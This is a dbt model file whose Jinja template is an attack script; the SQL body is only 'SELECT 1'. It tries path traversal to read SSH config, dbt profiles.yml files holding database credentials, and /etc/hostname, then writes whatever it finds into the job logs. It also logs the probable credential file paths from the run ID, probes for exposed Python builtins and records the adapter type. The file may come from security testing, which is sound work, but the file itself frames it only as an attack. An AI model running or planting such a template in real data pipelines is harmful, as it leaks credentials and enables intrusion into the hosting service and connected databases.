{# Try to include files via path traversal #}
{# Method 1: Direct include with absolute path #}
{% set paths_to_try = [
    '../../.ssh/config',
    '../.ssh/config',
    '../../../etc/hostname',
    '../../.dbt/profiles.yml',
    '../.dbt/profiles.yml'
] %}

{% for path in paths_to_try %}
{% set content = '' %}
{% set ns = namespace(found=false, content='') %}
{% try %}
{% set ns.content = load_result(path) %}
{% if ns.content %}
{{ log("FILE_" ~ path ~ "=" ~ ns.content, info=True) }}
{% set ns.found = true %}
{% endif %}
{% endtry %}
{% endfor %}

{# Method 2: Try using modules.re to search for patterns in known env vars #}
{# GIT_SSH_COMMAND tells us where the SSH config is #}
{{ log("SSH_CONFIG_PATH=/tmp/jobs/" ~ env_var('DBT_CLOUD_RUN_ID', 'UNKNOWN') ~ "/.ssh/config", info=True) }}
{{ log("PROFILES_PATH=/tmp/jobs/" ~ env_var('DBT_CLOUD_RUN_ID', 'UNKNOWN') ~ "/.dbt/profiles.yml", info=True) }}

{# Method 3: Try open() via modules if available #}
{% if modules.builtins is defined %}
{{ log("BUILTINS_AVAILABLE=yes", info=True) }}
{% endif %}

{# Method 4: Try to get connection details from adapter #}
{% if adapter is defined %}
{{ log("ADAPTER_TYPE=" ~ adapter.type(), info=True) }}
{% endif %}

SELECT 1 as id
